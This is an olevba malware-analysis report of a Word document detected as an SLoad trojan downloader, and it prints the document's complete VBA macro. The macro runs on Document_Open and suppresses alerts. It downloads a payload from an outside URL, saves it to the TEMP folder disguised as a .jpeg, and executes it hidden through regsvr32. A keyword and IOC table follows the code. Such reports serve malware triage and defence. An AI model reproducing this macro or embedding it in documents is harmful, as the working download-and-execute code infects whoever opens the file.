olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-66c29f2b59becca28c6aaf5f7a9c77c8db15f432b8581e22e6bcb7a5803b6b6e
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

 Application.ScreenUpdating = False
   Application.DisplayAlerts = False
   
Dim http_obj
Dim stream_obj
Dim Length As Integer
Dim CharacterBank As Variant
Dim x As Long
Dim str As String


'Test Length Input
Length = 8

CharacterBank = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", _
  "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", _
  "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", _
  "A", "B", "C", "D", "E", "F", "G", "H", _
  "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", _
  "W", "X", "Y", "Z")
  

'Randomly Select Characters One-by-One
  For x = 1 To Length
    Randomize
    str = str & CharacterBank(Int((UBound(CharacterBank) - LBound(CharacterBank) + 1) * Rnd + LBound(CharacterBank)))
  Next x

'Output Randomly Generated String
  RandomString = str


Set http_obj = CreateObject("Microsoft.XMLHTTP")
URL = "https://artofwork.live/view.php"
 'kjsdhasfsdff4sdfs5d4gssdd8sdfs7sdfddfdqdfgd54f5d4fsdsdfd
http_obj.Open "GET", URL, False
http_obj.setRequestHeader "User-Agent", "lmsevof"
On Error GoTo ErrorHandler
http_obj.send
 

If http_obj.Status = 200 Then
 Set stream_obj = CreateObject("ADODB.Stream")
 stream_obj.Type = 1
 stream_obj.Open
 stream_obj.write http_obj.responseBody
 stream_obj.savetofile VBA.Environ("TEMP") & "\" & RandomString & ".jpeg", 2
 Start = Timer
Do While Timer < Start + 10
  DoEvents
Loop
 Call Shell("cmd /c regsvr32 /s %Temp%\" & RandomString & ".jpeg", vbHide)
End If

ErrorHandler:
       


  Application.ScreenUpdating = True
   Application.DisplayAlerts = True

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|ADODB.Stream        |May create a text file                       |
|Suspicious|savetofile          |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Microsoft.XMLHTTP   |May download files from the Internet         |
|Suspicious|User-Agent          |May download files from the Internet         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://artofwork.li|URL                                          |
|          |ve/view.php         |                                             |
+----------+--------------------+---------------------------------------------+

